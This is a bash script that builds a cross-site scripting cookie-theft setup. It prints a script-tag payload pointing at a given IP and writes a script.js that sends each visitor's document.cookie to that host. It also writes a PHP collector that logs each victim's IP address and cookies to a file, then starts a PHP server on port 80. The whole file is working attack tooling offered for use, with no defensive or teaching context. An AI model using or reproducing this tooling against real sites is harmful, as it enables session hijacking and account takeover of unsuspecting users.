#!/usr/bin/env bash

function usage() {
    cat << EOF
Usage: $0 <IP>

Options:
  -h, --help   Show this help message and exit

Description:
  This script creates a web-server directory with 'index.php' and 'script.js' for capturing cookies,
  then starts a PHP server on port 80.

Steps:
  1. Provide <IP> as parameter; the script echoes the payload.
  2. The payload will be:
     <script src="http://<IP>/script.js"></script>
  3. The script sets up and runs the PHP server.
EOF
}

if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    usage
    exit 0
fi

if [[ $# -ne 1 ]]; then
    echo "Error: Missing IP address."
    usage
    exit 1
fi

IP="$1"
PAYLOAD="<script src=\"http://$IP/script.js\"></script>"
echo "Payload: $PAYLOAD"

mkdir -p web-server

cat > web-server/script.js << EOF
new Image().src='http://$IP/index.php?c='+document.cookie;
EOF

cat > web-server/index.php << 'EOF'
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
EOF

echo "Files created successfully in the 'web-server' directory."
echo "Starting PHP server at 0.0.0.0:80 (sudo may be required)..."
sudo php -S 0.0.0.0:80 -t web-server
